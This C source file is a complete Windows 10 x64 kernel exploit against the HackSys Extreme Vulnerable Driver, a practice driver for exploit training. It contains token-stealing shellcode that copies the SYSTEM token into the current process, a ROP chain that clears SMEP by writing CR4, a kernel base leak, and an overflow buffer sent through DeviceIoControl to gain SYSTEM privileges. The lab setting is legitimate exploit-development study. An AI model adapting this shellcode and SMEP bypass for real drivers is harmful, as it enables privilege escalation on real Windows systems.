#include "exploit.h"

// Link: https://github.com/h0mbre/Windows-Exploits/blob/master/Exploit-Code/HEVD/x64_StackOverflow_SMEP_Bypass.cpp
// This shellcode will eventually be overwritten with my own, for Windows 10 21H2 x64.
BYTE shellcode[] =
{
"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"      // mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
"\x4C\x8B\x82\xB8\x00\x00\x00"              // mov r8, [rdx + b8h]      ; _EPROCESS (kd> u PsGetCurrentProcess)
"\x4D\x8B\x88\xf0\x02\x00\x00"              // mov r9, [r8 + 2f0h]      ; ActiveProcessLinks list head
"\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
//find_system_proc:
"\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
"\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
"\x74\x05"                                  // jz found_system          ; Found SYSTEM token
"\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
"\xEB\xF1"                                  // jmp find_system_proc     ; Loop
//found_system:
"\x48\x8B\x41\x68"                          // mov rax, [rcx + 68h]     ; Offset from ActiveProcessLinks to Token
"\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
"\x49\x89\x80\x58\x03\x00\x00"              // mov [r8 + 358h], rax     ; Copy SYSTEM token to current process's token
"\x48\x83\xC4\x40"                          // add rsp, 040h
"\x48\x31\xF6"                              // xor rsi, rsi             ; Zeroing out rsi register to avoid Crash
"\x48\x31\xC0"                              // xor rax, rax             ; NTSTATUS Status = STATUS_SUCCESS
"\xc3"
};

int main(int argc, char** argv)
{
	HANDLE h_hevd = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long bytes_returned = 0;
	long long pop_rcx_gadget = 0, rcx_cr4_value = 0x70678, mov_cr4_rcx_gadget = 0, kernel_base = 0;
	unsigned long long* shellcode_address = 0;
	char unused = 0, output[1024], input[2104];

	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	system("title Stack Buffer Overflow SMEP Bypass");

	printf("%s[!] Exploit written by ExAllocatePool2.\n[!] Lets exploit!", BANNER);

	if (h_hevd == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the \"HackSys Extreme Vulnerable Driver.\" Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the \"HackSys Extreme Vulnerable Driver.\" Handle Value: 0x%p", h_hevd);

	kernel_base = leak_ntoskrnl_base_address();
	if (!kernel_base)
	{
		return 1;
	}

	pop_rcx_gadget = kernel_base + POP_RCX_OFFSET;
	mov_cr4_rcx_gadget = kernel_base + MOV_CR4_RCX_OFFSET;
	printf("\n[+] Located pop rcx + ret gadget. Gadget Address: 0x%p\n[+] Located mov cr4, rcx + ret gadget. Gadget Address: 0x%p", (long long*)pop_rcx_gadget, (long long*)mov_cr4_rcx_gadget);

	shellcode_address = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!shellcode_address)
	{
		printf("\n[-] Failed to allocate %d bytes of stack memory. Error: %d (0x%x)", (int)sizeof(shellcode), GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated %d bytes of stack memory. Shellcode Allocation Address: 0x%p", (int)sizeof(shellcode), shellcode_address);

	memcpy(shellcode_address, &shellcode, sizeof(shellcode));
	printf("\n[+] Mapped shellcode onto the allocation.");

	memset(&input, 'A', 2072);
	*(long long*)(input + 2072) = (long long*)pop_rcx_gadget;
	*(long long*)(input + 2080) = rcx_cr4_value;
	*(long long*)(input + 2088) = (long long*)mov_cr4_rcx_gadget;
	*(long long*)(input + 2096) = (long long*)shellcode_address;
	printf("\n[+] Crafted input buffer.\n[!] Redirecting code execution to payload address... Payload Address: 0x%p", (long long*)shellcode_address);

	Sleep(1000);

	DeviceIoControl(h_hevd, TARGET_IOCTL, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Exploit completed.");
	unused = getchar();

	return 0;
}